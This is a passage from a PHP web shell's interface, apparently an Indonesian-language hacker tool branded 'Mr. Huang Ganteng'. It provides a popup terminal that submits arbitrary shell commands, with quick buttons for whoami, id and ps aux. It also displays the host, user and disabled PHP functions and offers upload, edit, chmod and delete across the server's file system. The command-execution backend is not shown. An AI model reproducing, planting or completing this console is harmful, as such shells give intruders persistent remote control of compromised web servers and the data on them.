            z-index: 2000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            padding: 25px;
            border-radius: 12px;
            width: 400px;
            max-width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: modalSlide 0.3s ease;
        }
        @keyframes modalSlide {
            from { opacity: 0; transform: translateY(-50px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .modal-header {
            font-size: 20px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #e9ecef;
        }
        .modal-body { margin-bottom: 20px; }
        .modal-footer { display: flex; gap: 10px; justify-content: flex-end; }
        
        /* Footer */
        .footer {
            background: #2c3e50;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 14px;
        }
        .footer a { color: #43cea2; text-decoration: none; }
        
        /* Badge */
        .badge {
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
        }
        .badge-dir { background: #ffeaa7; color: #d35400; }
        .badge-file { background: #b2bec3; color: #2d3436; }
        
        @media (max-width: 768px) {
            .file-item {
                grid-template-columns: auto 1fr;
                gap: 10px;
            }
            .file-perms, .file-actions {
                grid-column: span 2;
            }
            .file-actions { justify-content: flex-start; }
            .terminal-popup {
                width: 95%;
                height: 90vh;
            }
        }
    </style>
</head>
<body>
    <script>
    function openRenameModal(oldPath, oldName) {
        document.getElementById('oldPath').value = oldPath;
        document.getElementById('newName').value = oldName;
        document.getElementById('renameModal').style.display = 'flex';
    }
    
    function closeRenameModal() {
        document.getElementById('renameModal').style.display = 'none';
    }
    
    // FUNGSI UNTUK CHMOD
    function openChmodModal(path, name, currentPerms) {
        document.getElementById('chmodPath').value = path;
        document.getElementById('chmodName').value = name;
        document.getElementById('chmodPerms').value = currentPerms;
        document.getElementById('chmodModal').style.display = 'flex';
    }
    
    function closeChmodModal() {
        document.getElementById('chmodModal').style.display = 'none';
    }
    
    function confirmDelete(name) {
        return confirm('🗑️ Yakin ingin menghapus ' + name + '?');
    }
    
    function setCommand(cmd) {
        document.getElementById('terminal_input_popup').value = cmd;
        document.getElementById('terminal_input_popup').focus();
    }
    
    function toggleTerminal() {
        var terminal = document.getElementById('terminalPopup');
        var overlay = document.getElementById('terminalOverlay');
        
        if (terminal.style.display === 'none' || terminal.style.display === '') {
            terminal.style.display = 'block';
            overlay.style.display = 'block';
            document.cookie = "terminal_status=open; path=/";
            setTimeout(function() {
                document.getElementById('terminal_input_popup').focus();
            }, 100);
        } else {
            terminal.style.display = 'none';
            overlay.style.display = 'none';
            document.cookie = "terminal_status=closed; path=/";
        }
    }
    
    function closeTerminal() {
        document.getElementById('terminalPopup').style.display = 'none';
        document.getElementById('terminalOverlay').style.display = 'none';
        document.cookie = "terminal_status=closed; path=/";
    }
    
    window.onclick = function(event) {
        var modal = document.getElementById('renameModal');
        if (event.target === modal) {
            modal.style.display = 'none';
        }
        var chmodModal = document.getElementById('chmodModal');
        if (event.target === chmodModal) {
            chmodModal.style.display = 'none';
        }
    }
    
    // Auto hide messages
    setTimeout(function() {
        var messages = document.querySelector('.message');
        if (messages) {
            messages.style.transition = 'opacity 0.5s';
            messages.style.opacity = '0';
            setTimeout(function() {
                if (messages.parentNode) {
                    messages.parentNode.removeChild(messages);
                }
            }, 500);
        }
    }, 5000);
    
    // Terminal auto scroll ke bawah
    window.onload = function() {
        var terminalBody = document.getElementById('terminal_body');
        if (terminalBody) {
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    }
    
    // Keyboard shortcut: Ctrl+` untuk buka/tutup terminal
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === '`') {
            e.preventDefault();
            toggleTerminal();
        }
    });
    </script>

    <!-- Rename Modal -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">✏️ Rename Item</div>
            <form method="POST">
                <div class="modal-body">
                    <input type="hidden" name="old_path" id="oldPath">
                    <input type="text" name="new_name" id="newName" class="text-input" placeholder="Nama baru..." required autofocus>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" onclick="closeRenameModal()">Batal</button>
                    <button type="submit" name="rename_item" class="btn btn-warning">✓ Rename</button>
                </div>
            </form>
        </div>
    </div>

    <!-- MODAL CHMOD -->
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">🔧 CHANGE PERMISSIONS</div>
            <form method="POST">
                <div class="modal-body">
                    <input type="hidden" name="chmod_path" id="chmodPath">
                    <label style="display: block; margin-bottom: 5px; color: #666;">File/Folder:</label>
                    <input type="text" id="chmodName" class="text-input" readonly style="background: #f0f0f0; margin-bottom: 15px;">
                    
                    <label style="display: block; margin-bottom: 5px; color: #666;">Permission (Octal):</label>
                    <input type="text" name="chmod_perms" id="chmodPerms" class="text-input" placeholder="755" value="755" pattern="[0-7]{3,4}" required>
                    <small style="display: block; margin-top: 5px; color: #999;">Contoh: 755, 644, 777, 600</small>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #f8f9fa; border-radius: 4px; font-size: 12px;">
                        <strong>Info:</strong><br>
                        7 = rwx (read, write, execute)<br>
                        6 = rw- (read, write)<br>
                        5 = r-x (read, execute)<br>
                        4 = r-- (read only)<br>
                        0 = --- (no permission)
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" onclick="closeChmodModal()">Batal</button>
                    <button type="submit" name="chmod_file" class="btn btn-warning">✓ Apply</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Terminal Overlay -->
    <div id="terminalOverlay" class="terminal-overlay" onclick="closeTerminal()"></div>

    <!-- Terminal Popup -->
    <div id="terminalPopup" class="terminal-popup">
        <div class="terminal-header">
            <div class="terminal-title">
                <span>💻 TERMINAL</span>
                <span class="current-dir"><?php echo htmlspecialchars($current_dir); ?></span>
            </div>
            <div class="terminal-status">
                <span>⚡ Multi-method</span>
                <button class="close-btn" onclick="closeTerminal()">✖ Tutup</button>
            </div>
        </div>
        
        <div class="terminal-body" id="terminal_body">
            <div class="terminal-output">
                <?php if (isset($_SESSION['last_output'])): ?>
                    <div class="terminal-line">
                        <div>
                            <span class="terminal-prompt">$</span>
                            <span class="terminal-command"><?php echo htmlspecialchars($_SESSION['last_output']['cmd']); ?></span>
                            <span class="terminal-time">[<?php echo $_SESSION['last_output']['time']; ?>]</span>
                        </div>
                        <?php if (!empty($_SESSION['last_output']['output'])): ?>
                            <div class="terminal-output-text"><?php echo nl2br(htmlspecialchars($_SESSION['last_output']['output'])); ?></div>
                        <?php endif; ?>
                    </div>
                    <?php unset($_SESSION['last_output']); ?>
                <?php else: ?>
                    <div class="terminal-line" style="color: #888; text-align: center; padding: 20px;">
                        Selamat datang di Terminal!<br>
                        Ketik perintah untuk memulai...<br>
                        <small>Contoh: ls -la, pwd, whoami, php -v, df -h</small>
                    </div>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- Quick Commands -->
        <div class="terminal-quick">
            <span class="quick-cmd" onclick="setCommand('pwd')">pwd</span>
            <span class="quick-cmd" onclick="setCommand('whoami')">whoami</span>
            <span class="quick-cmd" onclick="setCommand('id')">id</span>
            <span class="quick-cmd" onclick="setCommand('ls -la')">ls -la</span>
            <span class="quick-cmd" onclick="setCommand('php -v')">php -v</span>
            <span class="quick-cmd" onclick="setCommand('date')">date</span>
            <span class="quick-cmd" onclick="setCommand('df -h')">df -h</span>
            <span class="quick-cmd" onclick="setCommand('free -h')">free -h</span>
            <span class="quick-cmd" onclick="setCommand('ps aux')">ps aux</span>
        </div>
        
        <!-- Terminal Input -->
        <form method="POST">
            <div class="terminal-input-area">
                <span class="terminal-prompt-current">$</span>
                <input type="text" 
                       name="terminal_cmd" 
                       id="terminal_input_popup" 
                       class="terminal-input" 
                       placeholder="Ketik perintah di sini..." 
                       autocomplete="off"
                       value="">
                <button type="submit" class="btn btn-primary" style="margin-left: 10px;">⏎ Enter</button>
            </div>
        </form>
    </div>

    <div class="container">
        <!-- HEADER - Bisa Diklik untuk Buka/Tutup Terminal -->
        <div class="header" onclick="toggleTerminal()">
            <h1>
                Huang Ciieehh Imutzz Abizz
                <span>Klik Untuk Buka Terminal</span>
                <a href="?logout=1" class="logout-btn" onclick="event.stopPropagation(); return confirm('Logout?')">🚪 Logout</a>
            </h1>
            <div class="terminal-indicator">
                <span class="dot"></span>
                <span>Terminal: <?php echo $terminal_status === 'open' ? 'Terbuka' : 'Tertutup'; ?></span>
            </div>
            <div class="current-path">
                <strong>📁 Current Directory:</strong>
                <div class="breadcrumb" onclick="event.stopPropagation()">
                    <?php
                    $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
                    $path_build = '';
                    foreach ($path_parts as $index => $part) {
                        if (empty($part)) continue;
                        $path_build .= DIRECTORY_SEPARATOR . $part;
                        if ($index < count($path_parts) - 1) {
                            echo '<a href="?dir=' . urlencode($path_build) . '" onclick="event.stopPropagation()">' . htmlspecialchars($part) . '</a>';
                            echo '<span>/</span>';  // UBAH DARI › MENJADI /
                        } else {
                            echo '<strong style="color: white;">' . htmlspecialchars($part) . '</strong>';
                        }
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- SYSTEM INFO -->
        <div class="system-info">
            <div class="system-info-item">💻 OS: <?php echo $system_info['os']; ?></div>
            <div class="system-info-item">🌐 Host: <?php echo $system_info['host']; ?></div>
            <div class="system-info-item">🐘 PHP: <?php echo $system_info['php']; ?></div>
            <div class="system-info-item">👤 User: <?php echo $system_info['user']; ?></div>
            <div class="system-info-item">🚫 Disabled: <?php echo substr($system_info['disabled'], 0, 30); ?></div>
        </div>

        <!-- STATS -->
        <div class="stats">
            <span>📊 Items: <?php echo count($all_files) - 2; ?></span>
            <span>📁 Folders: <?php echo count($folders); ?></span>
            <span>🔒 Hidden: <?php echo count($hidden_files); ?></span>
            <span>📄 Files: <?php echo count($normal_files); ?></span>
            <span>💾 Free: <?php echo @formatSize(disk_free_space($current_dir)); ?></span>
            <?php $dir_perms = get_permission_display($current_dir); ?>
            <span>🔐 <?php echo $dir_perms['unix']; ?> (<?php echo $dir_perms['octal']; ?>)</span>
        </div>

        <!-- ACTIONS GRID -->
        <div class="actions-grid">
            <div class="action-card">
                <h3>📝 New File</h3>
                <form method="POST" class="action-form">
                    <input type="text" name="new_filename" class="text-input" placeholder="nama-file.txt" required>
                    <button type="submit" name="create_file" class="btn btn-primary">Buat</button>
                </form>
            </div>
            <div class="action-card">
                <h3>📁 New Folder</h3>
                <form method="POST" class="action-form">
                    <input type="text" name="new_foldername" class="text-input" placeholder="nama-folder" required>
                    <button type="submit" name="create_folder" class="btn btn-primary">Buat</button>
                </form>
            </div>
            <div class="action-card">
                <h3>🔄 Refresh</h3>
                <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-info" style="display: block; text-align: center;">⟲ Refresh</a>
            </div>
        </div>

        <!-- UPLOAD SECTION -->
        <div class="upload-section">
            <form method="POST" enctype="multipart/form-data" class="upload-form">
                <input type="file" name="file" class="file-input" required>
                <button type="submit" class="btn btn-success">📤 Upload File</button>
            </form>
            <div class="upload-info">
                <strong>ℹ️ Info:</strong> Max: <?php echo ini_get('upload_max_filesize'); ?> | 
                Post: <?php echo ini_get('post_max_size'); ?> | 
                Write: <?php echo is_writable($current_dir) ? '✅' : '❌'; ?> |
                Auto-rename jika duplicate
            </div>
        </div>

        <!-- MESSAGE -->
        <?php if ($message): ?>
            <div class="message <?php echo $msg_type; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <?php if ($editing_file): ?>
            <!-- EDITOR MODE -->
            <div class="editor-container">
                <div class="editor-header">
                    <div class="editor-title">✏️ Editing: <?php echo htmlspecialchars(basename($editing_file)); ?></div>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-secondary">← Back to Files</a>
                </div>
                <form method="POST">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($editing_file); ?>">
                    <textarea name="file_content" class="code-editor"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <div style="margin-top: 15px; text-align: right;">
                        <button type="submit" name="edit_file" class="btn btn-success">💾 Save File</button>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <!-- FILE LIST MODE -->
            <div class="file-list">
                <!-- Parent Directory Link -->
                <?php if ($current_dir !== $root): ?>
                    <?php $parent_perms = get_permission_display(dirname($current_dir)); ?>
                    <div class="file-item" style="background: #e8f4f8; border-radius: 8px; margin-bottom: 15px;">
                        <div class="file-icon">📂</div>
                        <div class="file-info">
                            <div class="file-name">
                                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #2c3e50; font-weight: bold;">
                                    ⬆️ .. (kembali 1 path)
                                </a>
                            </div>
                        </div>
                        <div class="file-perms <?php echo $parent_perms['writable'] ? 'perm-writable' : 'perm-readonly'; ?>" title="Unix: <?php echo $parent_perms['unix']; ?>\nOctal: <?php echo $parent_perms['octal']; ?>\nWritable: <?php echo $parent_perms['writable'] ? 'Yes' : 'No'; ?>">
                            <div class="perm-unix"><?php echo $parent_perms['unix']; ?></div>
                            <div class="perm-octal"><?php echo $parent_perms['octal']; ?></div>
                        </div>
                        <div class="file-actions"></div>
                    </div>
                <?php endif; ?>
                
                <!-- Folders Section -->
                <?php if (!empty($folders)): ?>
                <div class="file-section">
                    <h3>📁 FOLDERS <span><?php echo count($folders); ?></span></h3>
                    <?php foreach ($folders as $file): ?>
                        <?php 
                            $file_path = $current_dir . '/' . $file;
                            $perm_data = get_permission_display($file_path);
                            $modified = date("d M Y H:i", filemtime($file_path));
                        ?>
                        <div class="file-item">
                            <div class="file-icon">📁</div>
                            <div class="file-info">
                                <div class="file-name">
                                    <a href="?dir=<?php echo urlencode($file_path); ?>">
                                        <?php echo htmlspecialchars($file); ?>
                                    </a>
                                </div>
                                <div class="file-size">
                                    Modified: <?php echo $modified; ?>
                                </div>
                            </div>
                            <div class="file-perms <?php echo $perm_data['writable'] ? 'perm-writable' : 'perm-readonly'; ?>" title="Unix: <?php echo $perm_data['unix']; ?>\nOctal: <?php echo $perm_data['octal']; ?>\nWritable: <?php echo $perm_data['writable'] ? 'Yes' : 'No'; ?>">
                                <div class="perm-unix"><?php echo $perm_data['unix']; ?></div>
                                <div class="perm-octal"><?php echo $perm_data['octal']; ?></div>
                            </div>
                            <div class="file-actions">
                                <button type="button" class="btn-small btn-info" onclick="openChmodModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>', '<?php echo $perm_data['octal']; ?>')">
                                    🔧 CHMOD
                                </button>
                                <button type="button" class="btn-small btn-warning" onclick="openRenameModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>')">
                                    ✏️ Rename
                                </button>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file_path); ?>" 
                                   class="btn-small btn-danger" 
                                   onclick="return confirmDelete('<?php echo htmlspecialchars($file); ?>')">🗑️ Delete</a>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
                
                <!-- Hidden Files Section -->
                <?php if (!empty($hidden_files)): ?>
                <div class="file-section">
                    <h3>🔒 HIDDEN FILES <span><?php echo count($hidden_files); ?></span></h3>
                    <?php foreach ($hidden_files as $file): ?>
                        <?php 
                            $file_path = $current_dir . '/' . $file;
                            $perm_data = get_permission_display($file_path);
                            $file_size = formatSize(filesize($file_path));
                            $modified = date("d M Y H:i", filemtime($file_path));
                            $icon = isImage($file) ? '🖼️' : '📄';
                            
                            // Hitung URL untuk direct link
                            $file_url = path_to_url($file_path, $base_url);
                        ?>
                        <div class="file-item hidden-file">
                            <div class="file-icon"><?php echo $icon; ?></div>
                            <div class="file-info">
                                <div class="file-name">
                                    <?php echo htmlspecialchars($file); ?>
                                </div>
                                <div class="file-size">
                                    Size: <?php echo $file_size; ?> | Modified: <?php echo $modified; ?>
                                </div>
                            </div>
                            <div class="file-perms <?php echo $perm_data['writable'] ? 'perm-writable' : 'perm-readonly'; ?>" title="Unix: <?php echo $perm_data['unix']; ?>\nOctal: <?php echo $perm_data['octal']; ?>\nWritable: <?php echo $perm_data['writable'] ? 'Yes' : 'No'; ?>">
                                <div class="perm-unix"><?php echo $perm_data['unix']; ?></div>
                                <div class="perm-octal"><?php echo $perm_data['octal']; ?></div>
                            </div>
                            <div class="file-actions">
                                <!-- DIRECT LINK BUTTON - FITUR BARU -->
                                <?php if ($file_url != '#'): ?>
                                    <a href="<?php echo $file_url; ?>" target="_blank" class="btn-small btn-direct" title="Buka di tab baru">
                                        🔗 Direct
                                    </a>
                                <?php endif; ?>
                                
                                <button type="button" class="btn-small btn-info" onclick="openChmodModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>', '<?php echo $perm_data['octal']; ?>')">
                                    🔧 CHMOD
                                </button>
                                <button type="button" class="btn-small btn-warning" onclick="openRenameModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>')">
                                    ✏️ Rename
                                </button>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($file_path); ?>" 
                                   class="btn-small btn-info">📝 Edit</a>
                                <a href="<?php echo htmlspecialchars($file); ?>" class="btn-small btn-success" download>⬇️ Download</a>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file_path); ?>" 
                                   class="btn-small btn-danger" 
                                   onclick="return confirmDelete('<?php echo htmlspecialchars($file); ?>')">🗑️ Delete</a>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
                
                <!-- Normal Files Section -->
                <?php if (!empty($normal_files)): ?>
                <div class="file-section">
                    <h3>📄 FILES <span><?php echo count($normal_files); ?></span></h3>
                    <?php foreach ($normal_files as $file): ?>
                        <?php 
                            $file_path = $current_dir . '/' . $file;
                            $perm_data = get_permission_display($file_path);
                            $file_size = formatSize(filesize($file_path));
                            $modified = date("d M Y H:i", filemtime($file_path));
                            $icon = isImage($file) ? '🖼️' : '📄';
                            
                            // Hitung URL untuk direct link
                            $file_url = path_to_url($file_path, $base_url);
                        ?>
                        <div class="file-item">
                            <div class="file-icon"><?php echo $icon; ?></div>
                            <div class="file-info">
                                <div class="file-name">
                                    <?php echo htmlspecialchars($file); ?>
                                </div>
                                <div class="file-size">
                                    Size: <?php echo $file_size; ?> | Modified: <?php echo $modified; ?>
                                </div>
                            </div>
                            <div class="file-perms <?php echo $perm_data['writable'] ? 'perm-writable' : 'perm-readonly'; ?>" title="Unix: <?php echo $perm_data['unix']; ?>\nOctal: <?php echo $perm_data['octal']; ?>\nWritable: <?php echo $perm_data['writable'] ? 'Yes' : 'No'; ?>">
                                <div class="perm-unix"><?php echo $perm_data['unix']; ?></div>
                                <div class="perm-octal"><?php echo $perm_data['octal']; ?></div>
                            </div>
                            <div class="file-actions">
                                <!-- DIRECT LINK BUTTON - FITUR BARU -->
                                <?php if ($file_url != '#'): ?>
                                    <a href="<?php echo $file_url; ?>" target="_blank" class="btn-small btn-direct" title="Buka di tab baru">
                                        🔗 Direct
                                    </a>
                                <?php endif; ?>
                                
                                <button type="button" class="btn-small btn-info" onclick="openChmodModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>', '<?php echo $perm_data['octal']; ?>')">
                                    🔧 CHMOD
                                </button>
                                <button type="button" class="btn-small btn-warning" onclick="openRenameModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>')">
                                    ✏️ Rename
                                </button>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($file_path); ?>" 
                                   class="btn-small btn-info">📝 Edit</a>
                                <a href="<?php echo htmlspecialchars($file); ?>" class="btn-small btn-success" download>⬇️ Download</a>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file_path); ?>" 
                                   class="btn-small btn-danger" 
                                   onclick="return confirmDelete('<?php echo htmlspecialchars($file); ?>')">🗑️ Delete</a>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <!-- FOOTER -->
        <div class="footer">
            🧽 Mr. Huang Ganteng - TERMINAL POPUP | 
            <a href="#" onclick="toggleTerminal(); return false;">Buka/Tutup Terminal</a> |
            <a href="?logout=1" onclick="return confirm('Logout?')">Logout</a>
        </div>
    </div>
</body>
</html>
